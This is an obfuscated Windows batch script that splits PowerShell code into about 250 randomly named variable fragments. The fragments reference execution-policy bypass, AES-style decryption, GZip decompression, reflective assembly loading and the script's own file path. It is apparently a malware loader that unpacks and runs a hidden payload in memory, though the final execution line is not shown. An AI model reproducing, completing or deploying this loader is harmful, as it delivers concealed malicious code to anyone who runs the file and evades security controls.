@echo off
set "LNfFPCRWBE=v4Ir"
set "RioZhRWmXm=1] -"
set "eegiIGHozz=embl"
set "SXeZADgZaN=in $"
set "LUSluJEIao=]::("
set "BiEAQOBmRY=UGTu"
set "DyjPYvkMqt=tem."
set "NrpjvhpqkR=ing("
set "TVXzRlycMa=grap"
set "OGvRFCEaem=th('"
set "SHQyDlOVeO=pher"
set "euuERifDjM=se()"
set "RmjRDcRcIe=tryP"
set "ZvKgAfmcCg=.Len"
set "JgYiEBMKtE=sE ="
set "Odioyiuxum=);$n"
set "gocTZStLSG=gth)"
set "CUeIrNWbsZ=ose("
set "CTunlxyuMo=;$bs"
set "GlqEyyrYot=PKCS"
set "nhpdMnNFVF=$bsf"
set "RAIPjEQUSh=ach "
set "sWqLyBAMXR=Disp"
set "LvBHLkvQou= = ["
set "jfkERrPOwX=.Cre"
set "dDzLpMkeom=join"
set "LpuRARIvMt=yste"
set "GsVBtekvzc=ptor"
set "xjOCmGbVXL='txe"
set "zeBiCDoJyr= = N"
set "FrBYmZspwk=-1.."
set "YZEpuGopka=[Sys"
set "sNdjqgifjI=jKBh"
set "jQeshGSHUG=[IO."
set "IuTQsQUVMf===')"
set "ncihZokXaz=ode]"
set "FAixEtSzbv=pDZz"
set "SCXIUVVHau=$OfA"
set "qcTROOmFfj=3); "
set "UvIQVZdmSV=.IO."
set "ZBxVePoCeD=fore"
set "kUVLgbeMnV=.Sec"
set "IpXzZuyDjP=ispo"
set "pOVeLMzVYH=-4] "
set "GEydtIRCxt= '')"
set "lIfRhsAsEg=ress"
set "jyJbGntOpf=oArr"
set "WUsWhZuifB=;$JM"
set "mHBSDwNuzd=qswc"
set "TqCPNdooYp=oL'["
set "cjtXtRJFyP=);$f"
set "miAFaDPvjb=xo, "
set "BcbCWrSYEN=Secu"
set "CUrgzpjJhK==');"
set "YmbAKfkvhh=ecry"
set "wlanqqcJNT=ay()"
set "yKWXpkOIPN=7;$f"
set "pNZkwcqCTd=rt]:"
set "ZmNSRlLOMI=sion"
set "NxNdunhnwG=('%~f0'"
set "pscwTdiNte=join"
set "YEkClBMlSb=JAps"
set "jsqApxHQra=ptog"
set "DfuqZpuScP=ring"
set "gnDEJrdfiC=Bmor"
set "gsKZuHbPkJ=y.Ci"
set "pUTjTJJnQc=3HWs"
set "BqZshTBAnM=le  "
set "jiXeNCTAcL=rity"
set "DsprEXWJsK=ApsE"
set "jSRbueofGN=Syst"
set "aApcPgqXzi=New-"
set "qYKNqvwBkZ=$lyP"
set "AaYFJGCcNI=eam("
set "kyNpUUmaSI=Fina"
set "zmTECUuYKL=$OfA"
set "uCWluBiEHg=E = "
set "QrEkjbVZUH=('da"
set "CgnmvFxolj=plno"
set "hFJOFRnPcI=('l0"
set "NYbsKOWwyT=rofi"
set "mPpiykGVUA=k; }"
set "ZRpOIWTKsV=comp"
set "uIgyzfxRzr=smSt"
set "iPBvmyQXhV=Fo7l"
set "ZTalsnzlig=.Cry"
set "roaVgOHeUX=::De"
set "PjiSQndyMI=raph"
set "cokCpleyEn=)($e"
set "aGLVXuWZim=isfL"
set "tyaMecJjOu=null"
set "ZczOQBKnlP=ress"
set "eNahaSnzZV=nirt"
set "ZpyHwkHzBh=);$O"
set "kKbZNJWUUO=KRT "
set "MwkIlKhJsB=.Ass"
set "USGFjkkhhs=New-"
set "KRWALfbwVc=ose("
set "JeYhzCZsIW=Syst"
set "YtZyjfZRHs=g = "
set "zkfXPifJHe='[-1"
set "HQmDmEHUXN=.GZi"
set "aAANVmejfa=rans"
set "OutEBflmSO=('%*'"
set "yfHfrbZVqR=flec"
set "IhKuxNYhLJ=fw.T"
set "rsDIKPGLss=oint"
set "cJjbQaMSbt=ke($"
set "bbzZyYsRnk=($Xd"
set "BsHleVwvJu=JMKx"
set "NvFhRstuho=Invo"
set "HAOCqmLvLr=Stre"
set "PkTzQYXtWh=and "
set "oVAFMvpLbI=Conv"
set "VgkyKFZSRE=, $J"
set "bEhomrDMWu=Comp"
set "vRaICwscqV=m.Re"
set "uAEeCMSkzj=.Cop"
set "AiSLvnEsOS=$JMK"
set "vXyiQIalsI=Comp"
set "PCGXKdDPho=ApsE"
set "ZpIuUpXvJt=xdP."
set "GLywFenXoA=();$"
set "CkXfuMekWq=morF"
set "hMlgFuRcTM= = $"
set "UOxUcvbETT=am;$"
set "GSqnrLGIrz=);$f"
set "xCQfuYlgxN=+hAO"
set "nyaWbxfRpN=o = "
set "pHwEXRedzK=qqsw"
set "IFCJsfuyda=)($J"
set "AJsnsVtdCD=[Sys"
set "irQoonRBNG=;$pl"
set "cMWQpmpIuh=ert]"
set "VCARZxbRvM=yste"
set "HXWhoDyqgI=m.IO"
set "daGFzGQwrc=[Env"
set "NsEmFychUD=  $e"
set "JjGMwRHkwD=[]] "
set "tyAboEulmT=Mode"
set "VrNDFYBHOo=e]::"
set "UCWlYLDoFG=jKBh"
set "shAnQcGUOi=.Con"
set "UnJpSHgyGP=[Sys"
set "aDOLnIApQt=saBm"
set "SlbYEnlszx=, (,"
set "sYIGzWTAlW=] -j"
set "rhdXLqXTQX=comm"
set "wDbzXCLiFW=ss -"
set "dhRxeXprEr=lit("
set "KIuSFCkphi=-joi"
set "AZYmPJbnjC=Bh.I"
set "yYjWYAGctM=pose"
set "fMecxdXRZV=sGUc"
set "iPpuDTghtc=vert"
set "NpPzOhpsYb=pose"
set "cJMTKlJBIZ= [Sy"
set "YrBfulvUzf=urit"
set "KWdReJuBty=J.En"
set "fOHeIXzzeb=c = "
set "gBixnCJsZT=form"
set "dJsvBsuuRU=F'[-"
set "pnuAebcEvY=yste"
set "KqVMIILKRL= = $"
set "ZHckNygiln=mory"
set "XPJfDrUuSN=]::N"
set "XHhtyluYCh=V = "
set "YxbhCNYMDY=-ep "
set "FWnAVGwnKw= New"
set "LHfultXDOW=.Mod"
set "htHoqEYMPQ=E = "
set "GmrkMDORCW=lyPG"
set "vkYIFiaQKt=oin "
set "NyzQOOxjrb=brea"
set "HqEfuvTaGD=fbC "
set "opHMTYNeDx=gnir"
set "PRCYaUgWSt=[-1."
set "mPDqxiZExM=h.Pa"
set "kvaqtvzUtC== $f"
set "UfsYZdhfGt=KRT."
set "BBrXKyxQbX=rtS4"
set "RuwCRhnhQp=m(, "
set "gwMGsiazNf=($Xd"
set "tZIVERHPlA=ect "
set "fmZzmPYMlg=OyzA"
set "OuItBzveYE=fbC."
set "pRABTFutyS=oryS"
set "ghanJOgqDt=.Mem"
set "cxfATwKzXj=$fjK"
set "zRLklbQxOX='gni"
set "ixIMAcRwua=TllA"
set "thcBWctPbj=gMod"
set "KZvLgXeJUM=JAps"
set "CfqKQHTxyO=-Obj"
set "FXHHUMUACu=iron"
set "WFvPvXUrPC=ress"
set "cvzPZycPEX=raph"
set "RRfwBgjTWl=7Yiv"
set "FyVACzEwcU=m.IO"
set "SMeUlausNo=y]::"
set "SjeJGHxnvo=wc.D"
set "VTsvHaEyAh=..-1"
set "cDsFwaDCQA=bypa"
set "DfvtlboRcq=rity"
set "SqUFTmWFtd=.Com"
set "snDiYqLBjI=fw ="
set "RnmNTqgHEU= [st"
set "vvmEyoOXDx='[-1"
set "RUaTCqznnz=0O+g"
set "gmjIAYVZdq=smSt"
set "WaNvsWusAb=esFX"
set "dltZyvRyxX=ct S"
set "dZFTxidilv=S46e"
set "yhnnjmWSsq=em.I"
set "kRMujoRyuH=$JAp"
set "QhSLyKeADO=ion."
set "wCprYaejFy=Obje"
set "YCgjYnOBee=jKBh"
set "SOUDTgrYRc=Obje"
set "MguyJyPFXk=n ''"
set "OOPZsgyJbA=E) {"
set "gGnCFZDxwm=daeR"
set "jzRLiQhiiL=fw);"
set "lbLNUNpPAu=tsWi"
set "tqFsbyapzN=onve"
set "CyZPUHEWht=bjec"
set "xocuoGnsWd=O.Me"
set "LfVLZTtEel=)) {"
set "DCHuxySfOV=::('"
set "qMnLyRzhHb=);$q"
set "CyPxrBRSSS=ddin"
set "LIbhBteGTQ=e = "
set "iIVblggslf=ct S"
set "EUHOuBZpTs=.-16"
